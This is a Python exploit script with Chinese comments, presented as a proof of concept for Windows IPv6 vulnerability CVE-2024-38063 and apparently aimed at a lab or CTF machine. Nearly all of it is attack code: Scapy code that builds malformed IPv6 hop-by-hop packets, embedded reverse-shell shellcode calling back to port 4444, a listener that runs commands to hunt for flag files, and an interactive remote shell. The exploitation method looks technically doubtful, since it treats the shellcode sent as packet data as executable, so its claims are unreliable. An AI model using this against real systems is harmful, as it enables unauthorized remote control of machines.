#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2024-38063 漏洞利用 POC（Windows 版 - 手动 MAC 模式）
靶机信息：fe80::2aff:204f:626:892f%17（WLAN）
手动指定目标 MAC 地址，无需 NDP 解析
"""

import socket
import threading
import time
import sys
from scapy.all import *

# ================== 配置区（手动填写）==================
TARGET_IPV6 = "fe80::2aff:204f:626:892f%17"   # 靶机 IPv6（含接口索引）
OUTPUT_IFACE = "WLAN"                          # 攻击机的无线网卡名称
LISTEN_IP = "0.0.0.0"                         # 监听所有网卡
LISTEN_PORT = 4444                            # 监听端口（必须与 shellcode 中的端口一致）
PACKETS_COUNT = 200                           # 发送触发包数量

# ---------- 手动指定目标 MAC 地址（必须）----------
# 获取方式：在靶机上运行命令 ipconfig /all，找到 WLAN 适配器的物理地址
# 格式：小写字母，冒号分隔，例如 "2a:ff:20:4f:06:26"
TARGET_MAC = "ac:5a:fc:f4:b1:09"              # 请替换为实际 MAC

# ---------- 你的 shellcode（必须修改 IP 为攻击机地址）----------
# 当前示例连接 192.168.0.108:4444（这是靶机自身，错误！）
# 请改为攻击机 IPv4 地址，例如 192.168.0.100
payload = b""
payload += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41"
payload += b"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48"
payload += b"\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20"
payload += b"\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31"
payload += b"\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20"
payload += b"\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41"
payload += b"\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0"
payload += b"\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67"
payload += b"\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20"
payload += b"\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34"
payload += b"\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac"
payload += b"\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
payload += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
payload += b"\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
payload += b"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
payload += b"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a"
payload += b"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41"
payload += b"\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
payload += b"\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f"
payload += b"\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81"
payload += b"\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02"
payload += b"\x00\x11\x5c\xc0\xa8\x00\x6c\x41\x54\x49\x89"
payload += b"\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff"
payload += b"\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41"
payload += b"\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31"
payload += b"\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48"
payload += b"\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0"
payload += b"\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
payload += b"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff"
payload += b"\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63"
payload += b"\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50"
payload += b"\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0\x6a\x0d"
payload += b"\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01"
payload += b"\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89"
payload += b"\xe6\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff"
payload += b"\xc0\x41\x50\x49\xff\xc8\x4d\x89\xc1\x4c\x89"
payload += b"\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48\x31"
payload += b"\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d"
payload += b"\x60\xff\xd5\xbb\xcd\x64\x9f\x68\x41\xba\xa6"
payload += b"\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"
payload += b"\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72"
payload += b"\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
# ====================================================

class ReverseShellHandler:
    def __init__(self, listen_ip, listen_port):
        self.listen_ip = listen_ip
        self.listen_port = listen_port
        self.conn = None

    def start_listener(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.listen_ip, self.listen_port))
        server.listen(1)
        print(f"[*] 监听 {self.listen_ip}:{self.listen_port} 等待反弹 Shell...")

        self.conn, addr = server.accept()
        print(f"[+] 获得连接！来自 {addr}")
        self.extract_ctf_flags()
        self.interactive_shell()

    def safe_recv(self, sock, timeout=1):
        sock.settimeout(timeout)
        data = b''
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        except Exception as e:
            print(f"[!] 接收异常: {e}")
        finally:
            sock.settimeout(None)
        return data.decode(errors='ignore')

    def interactive_shell(self):
        print("\n[*] 进入交互式 Shell，输入 'exit' 退出\n")
        while True:
            cmd = input("Shell> ").strip()
            if cmd.lower() == 'exit':
                self.conn.send(b'exit\n')
                break
            if not cmd:
                continue
            self.conn.send((cmd + '\n').encode())
            response = self.safe_recv(self.conn)
            print(response)

    def extract_ctf_flags(self):
        print("\n[*] 尝试自动提取 Flag ...")
        commands = [
            'dir C:\\flag* /s /b 2>nul',
            'findstr /r /s "flag{" C:\\*.txt 2>nul',
            'type "C:\\flag.txt" 2>nul',
            'type "C:\\Users\\Administrator\\Desktop\\flag.txt" 2>nul',
            'type "C:\\Windows\\System32\\flag.txt" 2>nul',
            'reg query HKLM\\SOFTWARE\\CTF /v flag 2>nul',
        ]
        for cmd in commands:
            self.conn.send((cmd + '\n').encode())
            output = self.safe_recv(self.conn)
            if 'flag{' in output.lower() or 'ctf{' in output.lower():
                print(f"\n[!!!] 发现 Flag → {output.strip()}")
                return output
        print("[-] 未自动提取到 Flag，请手动查找。\n")
        return None


def craft_exploit_packet(target_ipv6_addr, shellcode):
    # 去掉接口索引（如果存在）
    if '%' in target_ipv6_addr:
        pure_ipv6 = target_ipv6_addr.split('%')[0]
    else:
        pure_ipv6 = target_ipv6_addr

    # 畸形逐跳头：Next Header = 59 (No Next Header)，len = 0 触发下溢
    hbh = IPv6ExtHdrHopByHop(nh=59, len=0, options=[PadN(optdata=b'\x00' * 12)])
    pkt = IPv6(dst=pure_ipv6, nh=0) / hbh / Raw(load=shellcode)
    return pkt


def trigger_vulnerability(target_ipv6, target_mac, iface_name, packets_count, shellcode):
    # 获取本机 MAC
    my_mac = get_if_hwaddr(iface_name)
    print(f"[+] 本机 MAC: {my_mac}")
    print(f"[+] 目标 MAC: {target_mac}（手动指定）")

    # 构造恶意 IPv6 包
    ipv6_pkt = craft_exploit_packet(target_ipv6, shellcode)
    # 封装以太网帧（不再需要 NDP 解析）
    l2_pkt = Ether(dst=target_mac, src=my_mac) / ipv6_pkt

    print(f"[*] 开始发送 {packets_count} 个触发包...")
    for i in range(packets_count):
        sendp(l2_pkt, iface=iface_name, verbose=False)
        if i % 10 == 0:
            print(f"[*] 已发送 {i}/{packets_count}")
    print("[+] 触发包发送完成")
    return True


def check_admin_windows():
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False


def main():
    if not check_admin_windows():
        print("[-] 本脚本需要管理员权限才能发送原始数据包。")
        print("    请右键点击命令提示符/PowerShell -> 以管理员身份运行")
        sys.exit(1)

    # 检查目标 MAC 是否已填写
    if TARGET_MAC == "2a:ff:20:4f:06:26" or not TARGET_MAC:
        print("[-] 错误：请先手动填写正确的目标 MAC 地址！")
        print("    获取方式：在靶机上运行 ipconfig /all，找到 WLAN 适配器的物理地址。")
        sys.exit(1)

    # 验证 MAC 格式
    import re
    if not re.match(r"([0-9a-f]{2}:){5}[0-9a-f]{2}", TARGET_MAC.lower()):
        print("[-] MAC 地址格式错误，请使用小写十六进制，冒号分隔，例如 '2a:ff:20:4f:06:26'")
        sys.exit(1)

    # 检查 Scapy 和接口
    try:
        from scapy.arch.windows import get_windows_if_list
        iface_list = get_windows_if_list()
        print("[+] Scapy 已初始化，Windows 接口列表获取成功。")
        iface_names = [iface.get('name', '') for iface in iface_list]
        if OUTPUT_IFACE not in iface_names:
            print(f"[-] 接口 '{OUTPUT_IFACE}' 不存在。可用接口：")
            for iface in iface_list:
                print(f"    {iface.get('name', 'Unknown')} - {iface.get('description', '')}")
            sys.exit(1)
    except Exception as e:
        print("[-] Scapy 无法获取网络接口，请确保已安装 Npcap（推荐）或 WinPcap。")
        print("    下载地址：https://npcap.com/")
        sys.exit(1)

    print(f"[+] 使用接口: {OUTPUT_IFACE}")
    print(f"[+] 目标 IPv6: {TARGET_IPV6}")
    print(f"[!] 重要：请确认 shellcode 中的 IP 已改为攻击机的实际 IP（当前是 192.168.0.108 即靶机自身）")
    input("按 Enter 继续，或 Ctrl+C 退出...")

    # 启动监听线程
    handler = ReverseShellHandler(LISTEN_IP, LISTEN_PORT)
    listener_thread = threading.Thread(target=handler.start_listener, daemon=True)
    listener_thread.start()
    time.sleep(1)

    # 发送触发包
    if not trigger_vulnerability(TARGET_IPV6, TARGET_MAC, OUTPUT_IFACE, PACKETS_COUNT, payload):
        sys.exit(1)

    print("\n[*] 等待靶机反弹 Shell，可按 Ctrl+C 终止...")
    try:
        while listener_thread.is_alive() and handler.conn is None:
            time.sleep(0.5)
        if handler.conn:
            listener_thread.join()
    except KeyboardInterrupt:
        print("\n[-] 用户中断，退出程序。")


if __name__ == "__main__":
    main()